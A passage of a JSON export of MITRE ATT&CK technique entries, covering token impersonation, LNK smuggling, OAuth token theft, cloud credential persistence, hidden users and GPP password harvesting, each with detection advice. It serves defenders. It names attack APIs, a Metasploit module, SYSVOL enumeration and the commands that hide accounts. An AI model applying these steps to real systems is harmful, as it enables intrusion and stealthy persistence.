      "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1134.001",
      "stix_id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
      "created": "2020-02-18T16:39:06.289000+00:00",
      "modified": "2025-04-15T19:58:48.792000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators."
    },
    "T1567.001": {
      "id": "T1567.001",
      "name": "Exfiltration to Code Repository",
      "description": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1567.001",
      "stix_id": "attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7",
      "created": "2020-03-09T14:51:11.772000+00:00",
      "modified": "2025-04-15T19:58:48.876000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity."
    },
    "T1021.007": {
      "id": "T1021.007",
      "name": "Cloud Services",
      "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1021.007",
      "stix_id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
      "created": "2023-02-21T19:38:13.371000+00:00",
      "modified": "2025-04-15T22:03:56.494000+00:00",
      "platforms": [
        "SaaS",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1205.001": {
      "id": "T1205.001",
      "name": "Port Knocking",
      "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1205.001",
      "stix_id": "attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd",
      "created": "2020-07-01T18:23:25.002000+00:00",
      "modified": "2025-04-25T14:47:21.421000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows."
    },
    "T1027.012": {
      "id": "T1027.012",
      "name": "LNK Icon Smuggling",
      "description": "Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation: Booby Trap Shortcut 2017)\n\nLNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads. \n",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.012",
      "stix_id": "attack-pattern--887274fc-2d63-4bdc-82f3-fae56d1d5fdc",
      "created": "2023-09-29T15:28:42.409000+00:00",
      "modified": "2025-04-15T22:44:37.776000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "\n"
    },
    "T1583.006": {
      "id": "T1583.006",
      "name": "Web Services",
      "description": "Adversaries may register for web services\u00a0that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: FireEye APT29)(Citation: Hacker News GitHub Abuse 2024) By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1583.006",
      "stix_id": "attack-pattern--88d31120-5bc7-4ce3-a9c0-7cf147be8e54",
      "created": "2020-10-01T00:50:29.936000+00:00",
      "modified": "2025-04-15T19:58:49.217000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Once adversaries leverage the web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567)."
    },
    "T1528": {
      "id": "T1528",
      "name": "Steal Application Access Token",
      "description": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nFor example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)  \n\nSimilarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.(Citation: Cider Security Top 10 CICD Security Risks) If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges. \n\nIn Azure, an adversary who compromises a resource with an attached Managed Identity, such as an Azure VM, can request short-lived tokens through the Azure Instance Metadata Service (IMDS). These tokens can then facilitate unauthorized actions or further access to other Azure services, bypassing typical credential-based authentication.(Citation: Entra Managed Identities 2025)(Citation: SpecterOps Managed Identity 2022)\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.  ",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1528",
      "stix_id": "attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a",
      "created": "2019-09-04T15:54:25.684000+00:00",
      "modified": "2025-04-15T19:58:49.300000+00:00",
      "platforms": [
        "SaaS",
        "Containers",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Modification",
        "User Account: User Account Modification"
      ],
      "defense_bypassed": [],
      "detection": "Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a \u201cHigh severity app permissions\u201d policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.\n\nSecurity analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app\u2019s purpose, or apps with old \u201cLast authorized\u201d fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.\n\nAdministrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access."
    },
    "T1598.002": {
      "id": "T1598.002",
      "name": "Spearphishing Attachment",
      "description": "Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email. In some cases, they may rely upon the recipient populating information, then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. In other cases, adversaries may leverage techniques such as [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) to harvest user credentials via fake login portals.(Citation: Huntress HTML Smuggling 2024)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1598.002",
      "stix_id": "attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc",
      "created": "2020-10-02T17:08:57.386000+00:00",
      "modified": "2025-04-15T19:58:49.390000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)"
    },
    "T1098.001": {
      "id": "T1098.001",
      "name": "Additional Cloud Credentials",
      "description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation: Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024) If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606) tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation Persistence)\n\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account.(Citation: Mandiant APT42 Operations 2024) As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user\u2019s primary password is reset.(Citation: Microsoft Entra ID App Passwords)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1098.001",
      "stix_id": "attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd",
      "created": "2020-01-19T16:10:15.008000+00:00",
      "modified": "2025-04-15T21:45:50.674000+00:00",
      "platforms": [
        "IaaS",
        "SaaS",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Modification",
        "Active Directory: Active Directory Object Creation",
        "Active Directory: Active Directory Object Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity."
    },
    "T1204": {
      "id": "T1204",
      "name": "User Execution",
      "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as:\n\n* Enabling [Remote Access Tools](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary\n* Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n* Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204)\n* Coerceing users to copy, paste, and execute malicious code manually(Citation: Reliaquest-execution)(Citation: proofpoint-selfpwn)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Tools](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1204",
      "stix_id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:58:49.690000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "IaaS",
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Instance: Instance Start",
        "File: File Creation",
        "Network Traffic: Network Connection Creation",
        "Container: Container Creation",
        "Instance: Instance Creation",
        "Network Traffic: Network Traffic Content",
        "Process: Process Creation",
        "Command: Command Execution",
        "Image: Image Creation",
        "Application Log: Application Log Content",
        "Container: Container Start"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe)."
    },
    "T1491.001": {
      "id": "T1491.001",
      "name": "Internal Defacement",
      "description": "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster)(Citation: Varonis) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1491.001",
      "stix_id": "attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103",
      "created": "2020-02-20T14:31:34.778000+00:00",
      "modified": "2025-04-15T19:58:49.776000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Network Traffic: Network Traffic Content",
        "Application Log: Application Log Content",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor internal and websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation."
    },
    "T1564.002": {
      "id": "T1564.002",
      "name": "Hidden Users",
      "description": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user\u2019s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.002",
      "stix_id": "attack-pattern--8c4aef43-48d5-49aa-b2af-c0cd58d30c3d",
      "created": "2020-03-13T20:12:40.876000+00:00",
      "modified": "2025-04-15T22:39:51.186000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "User Account: User Account Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation",
        "Command: Command Execution",
        "User Account: User Account Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for users that may be hidden from the login screen but still present in additional artifacts of usage such as directories and authentication logs. \n\nMonitor processes and command-line events for actions that could be taken to add a new user and subsequently hide it from login screens. Monitor Registry events for modifications to the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> key.\n\nIn macOS, monitor for commands, processes, and file activity in combination with a user that has a userID under 500.(Citation: Cybereason OSX Pirrit) Monitor for modifications to set the <code>Hide500Users</code> key value to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Monitor the command line for usage of the <code>dscl . create</code> command with the <code>IsHidden</code> attribute set to <code>1</code>.(Citation: Apple Support Hide a User Account) "
    },
    "T1134.003": {
      "id": "T1134.003",
      "name": "Make and Impersonate Token",
      "description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.\n\nThis behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1134.003",
      "stix_id": "attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819",
      "created": "2020-02-18T18:03:37.481000+00:00",
      "modified": "2025-04-15T19:58:49.948000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators."
    },
    "T1552.006": {
      "id": "T1552.006",
      "name": "Group Policy Preferences",
      "description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\n",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1552.006",
      "stix_id": "attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e",
      "created": "2020-02-11T18:43:06.253000+00:00",
      "modified": "2025-04-15T22:39:12.196000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for attempts to access SYSVOL that involve searching for XML files. \n\nDeploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)"
    },
    "T1048.002": {
      "id": "T1048.002",
      "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1048.002",
      "stix_id": "attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5",
      "created": "2020-03-15T15:34:30.767000+00:00",
      "modified": "2025-04-15T19:58:50.294000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Command: Command Execution",
        "File: File Access",
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) "
    },
    "T1087.004": {
      "id": "T1087.004",
      "name": "Cloud Account",
